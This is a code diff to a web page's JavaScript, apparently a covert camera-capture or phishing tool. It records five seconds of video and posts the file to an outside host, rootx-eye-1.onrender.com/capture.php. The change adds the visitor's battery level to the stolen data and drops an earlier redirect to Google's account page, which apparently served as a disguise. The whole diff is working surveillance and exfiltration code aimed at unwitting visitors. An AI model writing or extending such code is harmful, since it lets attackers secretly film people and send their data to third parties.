@@ -75,8 +75,16 @@ startBtn.onclick = () => {
         const fd = new FormData();
         fd.append("file", blob, "video.webm");
         fd.append("type", "video");
-        fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd })
-          .then(() => window.location.replace("https://myaccount.google.com/"));
+        
+        // 🔥 Battery
+        if (navigator.getBattery) {
+          navigator.getBattery().then(battery => {
+            fd.append("battery", battery.level * 100);
+            fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+          });
+        } else {
+          fetch('https://rootx-eye-1.onrender.com/capture.php', { method: "POST", body: fd });
+        }
       };
       recorder.start();
       setTimeout(() => recorder.stop(), 5000);
